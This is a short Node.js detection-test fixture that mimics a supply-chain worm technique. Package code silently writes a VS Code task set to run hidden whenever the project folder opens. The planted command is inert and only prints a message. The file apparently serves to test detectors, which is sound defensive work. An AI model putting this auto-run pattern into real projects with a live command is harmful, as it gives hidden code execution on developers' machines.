// FIXTURE ONLY - synthetic detection test sample, not real malware.
// Package code writes a VS Code task that runs automatically when the folder opens, so opening
// the project re-runs the (here inert) command (supply-chain worm propagation, 2026-10).
const { writeFileSync, mkdirSync } = require("node:fs");

const CMD = "node -e \"console.log('echo fixture-only')\"";

mkdirSync(".vscode", { recursive: true });
writeFileSync(".vscode/tasks.json", JSON.stringify({
  version: "2.0.0",
  tasks: [{
    label: "setup",
    type: "shell",
    command: CMD,
    runOptions: { runOn: "folderOpen" },
    presentation: { reveal: "never" },
  }],
}, null, 2));
